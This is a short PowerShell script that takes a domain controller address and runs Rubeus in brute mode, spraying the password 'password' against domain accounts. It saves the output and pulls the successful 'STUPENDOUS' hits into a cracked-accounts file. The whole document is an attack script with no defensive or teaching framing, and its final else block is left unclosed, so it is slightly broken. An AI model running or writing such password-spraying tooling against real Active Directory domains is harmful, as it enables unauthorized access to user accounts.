

$global:target=$args[0]


function run-rubeus {
date 

.\Rubeus_4.5.exe brute /password:password /dc:$target /noticket
Get-Content .\rubeus_brute.txt | findstr STUPENDOUS | sort-object| Get-Unique > rubeus_brute_cracked.txt


date
echo ""
echo ""
echo "################ FINISHED ################"
echo ""
Get-Content .\rubeus_brute_cracked.txt
}

if ($target) { 
run-rubeus | Tee rubeus_brute.txt
} else {
Write-Host "USEAGE: " 
Write-Host "	./rubeus-brute.ps1 [IP ADDRESS]" 
Write-Host "" 
Write-Host "" 
#}



